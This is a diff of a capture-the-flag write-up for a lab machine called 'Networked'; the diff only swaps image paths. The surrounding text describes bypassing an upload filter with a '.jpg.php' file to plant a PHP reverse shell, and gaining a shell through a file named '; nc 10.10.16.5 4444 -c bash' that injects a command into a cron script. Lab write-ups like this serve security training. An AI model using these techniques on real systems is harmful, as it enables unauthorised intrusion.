@@ -4,17 +4,17 @@
 
 Nmap scan:
 
-![](<../../../.gitbook/assets/image%20(3764).png>)
+![](../../../.gitbook/assets/networked-10.png)
 
 ### File Upload RCE
 
 First, we can use `gobuster` on the website:
 
-![](<../../../.gitbook/assets/image%20(794).png>)
+![](../../../.gitbook/assets/networked-12.png)
 
 The `/backup` directory would show us a directory with a backup file:
 
-![](<../../../.gitbook/assets/image%20(1786).png>)
+![](../../../.gitbook/assets/networked-2.png)
 
 Within the backup file, there's this PHP code here:
 
@@ -74,13 +74,13 @@ if( isset($_POST['submit']) ) {
 
 In short, we can see that this file checks for the file extensions before accepting a file. Seeing that this is a PHP file, we can attempt to upload a PHP reverse shell. To bypass the extension check, notice how it uses `substr_compare` and verifies whether a valid extension is present. As such, we can create a file ending in `.jpg.php` to bypass this:
 
-![](<../../../.gitbook/assets/image%20(2311).png>)
+![](../../../.gitbook/assets/networked-4.png)
 
 Then, we can upload it to `upload.php`. We can visit `photos.php` to trigger the shell:
 
-![](<../../../.gitbook/assets/image%20(995).png>)
+![](../../../.gitbook/assets/networked-13.png)
 
-![](<../../../.gitbook/assets/image%20(2702).png>)
+![](../../../.gitbook/assets/networked-7.png)
 
 ## Privilege Escalation
 
@@ -88,32 +88,32 @@ Then, we can upload it to `upload.php`. We can visit `photos.php` to trigger the
 
 Within the machine, we can view the user `guly` directory:
 
-![](<../../../.gitbook/assets/image%20(2145).png>)
+![](../../../.gitbook/assets/networked-3.png)
 
 The crontab specifies that the user is running the `check_attack` script routinely.
 
-![](<../../../.gitbook/assets/image%20(590).png>)
+![](../../../.gitbook/assets/networked-11.png)
 
 One dangerous part of this script is the usage of `exec` to run stuff. The `$value` variable is not sanitised, and we can exploit this by creating a file with the name of `; nc 10.10.16.5 4444 -c bash` within the `/var/www/html/uploads` directory. After doing this and waiting, we would gain a reverse shell and can capture the user flag:
 
-![](<../../../.gitbook/assets/image%20(2874).png>)
+![](../../../.gitbook/assets/networked-9.png)
 
 ### To Root
 
 We can check the `sudo` privileges of this user and find that there's one script we can run as `root`.
 
-![](<../../../.gitbook/assets/image%20(2449).png>)
+![](../../../.gitbook/assets/networked-5.png)
 
 Here's the script's contents:
 
-![](<../../../.gitbook/assets/image%20(2809).png>)
+![](../../../.gitbook/assets/networked-8.png)
 
 This takes user input and executes does not sanitise it at all. When we run the script, we can actually execute commands:
 
-![](<../../../.gitbook/assets/image%20(1438).png>)
+![](../../../.gitbook/assets/networked-1.png)
 
 To get a `root` shell, we just need to run `/bin/bash`:
 
-![](<../../../.gitbook/assets/image%20(262).png>)
+![](../../../.gitbook/assets/networked-6.png)
 
 Rooted!
